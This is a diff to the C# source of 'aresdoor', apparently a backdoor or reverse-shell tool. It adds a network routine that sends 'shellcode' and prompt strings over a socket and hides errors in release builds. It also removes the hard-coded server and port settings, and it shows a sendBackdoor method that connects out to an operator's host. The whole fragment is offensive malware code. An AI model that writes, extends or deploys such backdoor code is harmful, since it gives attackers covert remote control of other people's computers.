@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Net;
+using System.Net.Sockets;
 
 namespace aresdoor
 {
@@ -78,16 +79,31 @@ namespace aresdoor
         }
     }
 
+    class NetworkCommunication
+    {
+        public bool dataTravelTO(NetworkStream stream, string rawDataToSend)
+        {
+            try
+            {
+                byte[] dataToSend = Misc.byteCode(rawDataToSend);
+                stream.Write(dataToSend, 0, dataToSend.Length); // Send Shellcode
+
+                return true; // If we got here then it worked!
+#if DEBUG
+            } catch (Exception exc)
+            { Console.WriteLine(exc.Message); return false; }
+#else
+            } catch (Exception)
+            { return false; }
+#endif
+        }
+    }
+
     class Program
     {
         private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
         private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
-
-        // Modify these variables as needed.
-        private static string server = "localhost";
-        private static int port = 9000;
-        private static bool prevent_shutdown = false;
-        private static bool debugMode = true;
+        
         
         private static void sendBackdoor(string server, int port)
         {
